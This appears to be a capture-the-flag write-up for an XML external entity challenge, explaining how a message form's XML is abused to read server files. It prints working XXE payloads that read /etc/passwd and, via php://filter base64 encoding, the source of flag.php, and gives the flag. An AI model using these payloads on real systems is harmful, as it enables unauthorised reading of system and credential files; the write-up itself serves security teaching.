# xxe1

## What it is

A website with an input field.

The message is sent to the server in the form of an xml (base64 + URI encoded).

The decoded xml looks like this:
```xml
<?xml version="1.0"?>
<document>
	<message>abc</message>
</document>
```

It returns a message like this:
```
Thanks for your message: 'abc'
```

In the source of the page we can see:
```html
<!-- // include_once('flag.php'); -->
```

## Solution

(see solve.js)

[xxe overview](https://portswigger.net/web-security/xxe)

We can use some xml features to retrieve external entities from the server ([source](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)).

For example:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<document>
	<message>&xxe;</message>
</document>
```

```file://``` will not work for ```flag.php``` because it will be interpreted by php, we can use ```php://filter/convert.base64-encode/resource=``` instead (see [lfi1](#lfi1)).

The final payload looks like this:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>
<document>
	<message>&xxe;</message>
</document>
```

flag.php:
```php
<?php

$flag = "BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}";
```

flag: ```BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}```
